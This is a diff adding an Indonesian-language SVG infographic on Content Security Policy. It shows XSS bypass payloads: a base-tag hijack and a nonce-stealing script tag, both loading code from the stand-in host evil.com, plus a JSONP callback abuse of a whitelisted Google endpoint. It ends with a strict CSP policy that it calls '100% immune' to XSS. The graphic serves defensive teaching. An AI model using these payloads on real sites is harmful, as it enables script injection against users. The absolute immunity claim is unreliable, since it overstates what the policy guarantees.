@@ -1,0 +1,183 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 560" width="100%" height="100%">
+  <defs>
+    <!-- Background Gradient -->
+    <linearGradient id="bgGrad6" x1="0%" y1="0%" x2="100%" y2="100%">
+      <stop offset="0%" stop-color="#090D16"/>
+      <stop offset="50%" stop-color="#0F172A"/>
+      <stop offset="100%" stop-color="#090D16"/>
+    </linearGradient>
+
+    <!-- Card Backgrounds -->
+    <linearGradient id="cardGrad6" x1="0%" y1="0%" x2="0%" y2="100%">
+      <stop offset="0%" stop-color="#1E293B" stop-opacity="0.95"/>
+      <stop offset="100%" stop-color="#0F172A" stop-opacity="0.95"/>
+    </linearGradient>
+
+    <!-- Shadows -->
+    <filter id="cardShadow6" x="-10%" y="-10%" width="120%" height="125%">
+      <feDropShadow dx="0" dy="8" stdDeviation="12" flood-color="#000000" flood-opacity="0.5"/>
+    </filter>
+
+    <!-- Marker Arrow -->
+    <marker id="arrowCyan6" markerWidth="10" markerHeight="10" refX="6" refY="3" orient="auto">
+      <path d="M0,0 L0,6 L8,3 z" fill="#38BDF8"/>
+    </marker>
+  </defs>
+
+  <style>
+    .title { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-weight: 800; fill: #F8FAFC; }
+    .subtitle { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-weight: 500; fill: #94A3B8; }
+    .card-title { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-weight: 700; }
+    .code-text { font-family: 'JetBrains Mono', monospace; font-size: 10px; font-weight: 600; }
+    .desc-text { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-size: 11px; fill: #CBD5E1; }
+    .badge { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-size: 10px; font-weight: 700; }
+  </style>
+
+  <!-- Base Canvas -->
+  <rect width="1080" height="560" rx="16" fill="url(#bgGrad6)"/>
+  <rect width="1080" height="560" rx="16" fill="none" stroke="#334155" stroke-width="1.5" stroke-opacity="0.6"/>
+
+  <!-- Header -->
+  <g transform="translate(48, 40)">
+    <rect x="0" y="0" width="150" height="24" rx="12" fill="#0284C7" fill-opacity="0.15" stroke="#0284C7" stroke-width="1"/>
+    <text x="75" y="16" text-anchor="middle" class="badge" fill="#38BDF8">CSP DEFENSE &amp; BYPASS</text>
+    <text x="165" y="18" class="title" font-size="20">Content Security Policy (CSP): Anatomi &amp; 4 Vektor Bypass XSS</text>
+    <text x="0" y="42" class="subtitle" font-size="13">Memahami Pembatasan Policy Browser, Celah Konfigurasi (Misconfiguration), &amp; Teknik Bypass Praktis</text>
+  </g>
+
+  <!-- ==================== CARD 1: BASE-URI HIJACKING ==================== -->
+  <g transform="translate(48, 115)" filter="url(#cardShadow6)">
+    <rect width="230" height="405" rx="12" fill="url(#cardGrad6)" stroke="#38BDF8" stroke-width="1.5"/>
+    <text x="18" y="32" class="card-title" font-size="14" fill="#38BDF8">1. Base-URI Hijacking</text>
+    <text x="18" y="48" class="desc-text" font-size="10.5" fill="#94A3B8">Missing base-uri Directive</text>
+    <line x1="18" y1="60" x2="212" y2="60" stroke="#334155" stroke-width="1"/>
+
+    <!-- Context -->
+    <rect x="14" y="70" width="202" height="75" rx="6" fill="#090D16" stroke="#1E293B" stroke-width="1"/>
+    <text x="22" y="88" class="badge" fill="#7DD3FC">KELEMAHAN CSP:</text>
+    <text x="22" y="106" class="code-text" fill="#CBD5E1">script-src 'nonce-xyz'</text>
+    <text x="22" y="122" class="desc-text">CSP tidak menyertakan</text>
+    <text x="22" y="136" class="desc-text">aturan <tspan fill="#FDA4AF">base-uri 'none'</tspan>!</text>
+
+    <!-- Attack -->
+    <rect x="14" y="155" width="202" height="150" rx="6" fill="#0F172A" stroke="#0284C7" stroke-width="1"/>
+    <text x="22" y="175" class="badge" fill="#38BDF8">PAYLOAD INJEKSI:</text>
+    
+    <rect x="20" y="185" width="190" height="44" rx="4" fill="#0C4A6E" stroke="#38BDF8" stroke-width="1"/>
+    <text x="24" y="200" class="code-text" font-size="9" fill="#E0F2FE">&lt;base href="</text>
+    <text x="24" y="216" class="code-text" font-size="9" fill="#FDE047">https://evil.com/"&gt;</text>
+
+    <text x="22" y="246" class="desc-text">Script relatif pada web:</text>
+    <text x="22" y="262" class="code-text" font-size="8.5" fill="#94A3B8">&lt;script nonce=xyz src="/app.js"&gt;</text>
+    <text x="22" y="280" class="desc-text">akan dimuat dari domain:</text>
+    <text x="22" y="296" class="code-text" font-size="8.5" fill="#34D399">https://evil.com/app.js</text>
+
+    <!-- Status -->
+    <rect x="14" y="318" width="202" height="70" rx="6" fill="#0284C7" fill-opacity="0.1" stroke="#0284C7" stroke-width="1"/>
+    <text x="22" y="338" class="badge" fill="#7DD3FC">⚡ RESULT:</text>
+    <text x="22" y="356" class="desc-text">Script jahat jalan sah</text>
+    <text x="22" y="372" class="desc-text">karena membawa nonce asli!</text>
+  </g>
+
+  <!-- ==================== CARD 2: JSONP & CDN GADGETS ==================== -->
+  <g transform="translate(294, 115)" filter="url(#cardShadow6)">
+    <rect width="230" height="405" rx="12" fill="url(#cardGrad6)" stroke="#10B981" stroke-width="1.5"/>
+    <text x="18" y="32" class="card-title" font-size="14" fill="#6EE7B7">2. Whitelisted JSONP</text>
+    <text x="18" y="48" class="desc-text" font-size="10.5" fill="#94A3B8">CDN Endpoint Abuse</text>
+    <line x1="18" y1="60" x2="212" y2="60" stroke="#334155" stroke-width="1"/>
+
+    <!-- Context -->
+    <rect x="14" y="70" width="202" height="75" rx="6" fill="#090D16" stroke="#1E293B" stroke-width="1"/>
+    <text x="22" y="88" class="badge" fill="#6EE7B7">KELEMAHAN CSP:</text>
+    <text x="22" y="106" class="code-text" fill="#CBD5E1">script-src https://*.google.com</text>
+    <text x="22" y="122" class="desc-text">Whitelist domain pihak ke-3</text>
+    <text x="22" y="136" class="desc-text">yang memiliki endpoint JSONP.</text>
+
+    <!-- Attack -->
+    <rect x="14" y="155" width="202" height="150" rx="6" fill="#0F172A" stroke="#047857" stroke-width="1"/>
+    <text x="22" y="175" class="badge" fill="#34D399">PAYLOAD INJEKSI:</text>
+    
+    <rect x="20" y="185" width="190" height="52" rx="4" fill="#064E3B" stroke="#10B981" stroke-width="1"/>
+    <text x="24" y="200" class="code-text" font-size="8.5" fill="#ECFDF5">&lt;script src="https://</text>
+    <text x="24" y="214" class="code-text" font-size="8" fill="#ECFDF5">accounts.google.com/o/oauth2</text>
+    <text x="24" y="228" class="code-text" font-size="8.5" fill="#FDE047">/revoke?callback=alert"&gt;</text>
+
+    <text x="22" y="255" class="desc-text">Server CDN mengeksekusi:</text>
+    <text x="22" y="271" class="code-text" font-size="8.5" fill="#FDE047">alert({"status":"ok"})</text>
+    <text x="22" y="291" class="desc-text">Lolos karena domain trusted!</text>
+
+    <!-- Status -->
+    <rect x="14" y="318" width="202" height="70" rx="6" fill="#047857" fill-opacity="0.1" stroke="#10B981" stroke-width="1"/>
+    <text x="22" y="338" class="badge" fill="#A7F3D0">⚡ RESULT:</text>
+    <text x="22" y="356" class="desc-text">Eksekusi kode JS via</text>
+    <text x="22" y="372" class="desc-text">respon callback JSONP!</text>
+  </g>
+
+  <!-- ==================== CARD 3: DANGLING MARKUP NONCE STEAL ==================== -->
+  <g transform="translate(540, 115)" filter="url(#cardShadow6)">
+    <rect width="240" height="405" rx="12" fill="url(#cardGrad6)" stroke="#F59E0B" stroke-width="1.5"/>
+    <text x="18" y="32" class="card-title" font-size="14" fill="#FBBF24">3. Nonce Stealing</text>
+    <text x="18" y="48" class="desc-text" font-size="10.5" fill="#94A3B8">Dangling Markup Injection</text>
+    <line x1="18" y1="60" x2="222" y2="60" stroke="#334155" stroke-width="1"/>
+
+    <!-- Context -->
+    <rect x="14" y="70" width="212" height="75" rx="6" fill="#090D16" stroke="#1E293B" stroke-width="1"/>
+    <text x="22" y="88" class="badge" fill="#FDE047">KELEMAHAN SINK:</text>
+    <text x="22" y="106" class="code-text" fill="#CBD5E1">Injeksi di atas script ber-nonce</text>
+    <text x="22" y="122" class="desc-text">Penyerang mengirim tag script</text>
+    <text x="22" y="136" class="desc-text">terbuka tanpa atribut nonce.</text>
+
+    <!-- Attack -->
+    <rect x="14" y="155" width="212" height="150" rx="6" fill="#0F172A" stroke="#D97706" stroke-width="1"/>
+    <text x="22" y="175" class="badge" fill="#FBBF24">PAYLOAD INJEKSI:</text>
+    
+    <rect x="20" y="185" width="200" height="42" rx="4" fill="#451A03" stroke="#F59E0B" stroke-width="1"/>
+    <text x="24" y="200" class="code-text" font-size="9" fill="#FEF08A">&lt;script src="https://</text>
+    <text x="24" y="214" class="code-text" font-size="9" fill="#FEF08A">evil.com/xss.js"</text>
+
+    <text x="22" y="244" class="desc-text">HTML asli server setelahnya:</text>
+    <text x="22" y="260" class="code-text" font-size="8.5" fill="#FDE68A">nonce="abc123xyz"&gt;&lt;/script&gt;</text>
+    <text x="22" y="280" class="desc-text">Tag hacker menyerap atribut</text>
+    <text x="22" y="296" class="desc-text">nonce milik script sah!</text>
+
+    <!-- Status -->
+    <rect x="14" y="318" width="212" height="70" rx="6" fill="#D97706" fill-opacity="0.1" stroke="#F59E0B" stroke-width="1"/>
+    <text x="22" y="338" class="badge" fill="#FDE68A">⚡ RESULT:</text>
+    <text x="22" y="356" class="desc-text">Browser menganggap script</text>
+    <text x="22" y="372" class="desc-text">hacker memiliki nonce sah!</text>
+  </g>
+
+  <!-- ==================== CARD 4: STRICT CSP BLUEPRINT ==================== -->
+  <g transform="translate(796, 115)" filter="url(#cardShadow6)">
+    <rect width="236" height="405" rx="12" fill="url(#cardGrad6)" stroke="#8B5CF6" stroke-width="1.5"/>
+    <text x="18" y="32" class="card-title" font-size="14" fill="#C4B5FD">4. Strict CSP Defense</text>
+    <text x="18" y="48" class="desc-text" font-size="10.5" fill="#94A3B8">Golden Standard Policy</text>
+    <line x1="18" y1="60" x2="218" y2="60" stroke="#334155" stroke-width="1"/>
+
+    <!-- Hardened Rules -->
+    <rect x="14" y="70" width="208" height="235" rx="6" fill="#090D16" stroke="#6D28D9" stroke-width="1"/>
+    <text x="22" y="90" class="badge" fill="#C4B5FD">STANDAR CSP RESMI:</text>
+    
+    <text x="22" y="112" class="code-text" font-size="8.5" fill="#DDD6FE">script-src 'nonce-{RANDOM}'</text>
+    <text x="22" y="126" class="code-text" font-size="8.5" fill="#A78BFA">  'strict-dynamic';</text>
+
+    <text x="22" y="150" class="code-text" font-size="8.5" fill="#DDD6FE">object-src 'none';</text>
+    <text x="22" y="166" class="desc-text" font-size="10">Blokir Flash/Plugin</text>
+
+    <text x="22" y="190" class="code-text" font-size="8.5" fill="#F43F5E">base-uri 'none';</text>
+    <text x="22" y="206" class="desc-text" font-size="10">Cegah Base Tag Hijack</text>
+
+    <text x="22" y="230" class="code-text" font-size="8.5" fill="#DDD6FE">frame-ancestors 'none';</text>
+    <text x="22" y="246" class="desc-text" font-size="10">Cegah Clickjacking</text>
+
+    <text x="22" y="270" class="code-text" font-size="8.5" fill="#34D399">require-trusted-types-for</text>
+    <text x="22" y="284" class="code-text" font-size="8.5" fill="#34D399">  'script';</text>
+
+    <!-- Status -->
+    <rect x="14" y="318" width="208" height="70" rx="6" fill="#6D28D9" fill-opacity="0.2" stroke="#8B5CF6" stroke-width="1"/>
+    <text x="22" y="338" class="badge" fill="#C4B5FD">🛡️ PERTAHANAN KOKOH:</text>
+    <text x="22" y="356" class="desc-text">100% Kebal terhadap XSS</text>
+    <text x="22" y="372" class="desc-text">dan seluruh vektor bypass!</text>
+  </g>
+
+</svg>
